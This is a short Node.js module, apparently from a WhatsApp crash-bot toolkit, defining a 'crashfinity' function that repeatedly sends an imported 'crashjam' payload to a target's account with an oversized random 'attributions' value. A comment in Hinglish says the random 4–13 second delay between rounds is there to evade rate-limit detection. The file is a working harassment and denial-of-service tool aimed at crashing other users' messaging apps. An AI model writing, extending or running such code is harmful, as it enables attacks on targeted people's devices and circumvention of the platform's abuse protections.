const { crashjam } = require('./crashjam');

async function crashfinity(sock, targetJid, opts = {}) {
  const rounds = opts.rounds || 10;
  for (let i = 0; i < rounds; i++) {
    try {
      await crashjam(sock, targetJid, {
        attributions: 50000 + Math.floor(Math.random() * 150000)
      });
      console.log(`[crashfinity] round${i + 1} ok`);
    } catch (e) { console.log(`[crashfinity] round${i + 1}: ${e.message}`); }
    // random 4-13 sec delay — rate-limit detection se bachne ke liye
    await new Promise(r => setTimeout(r, (4 + Math.random() * 9) * 1000));
  }
}

module.exports = { crashfinity };
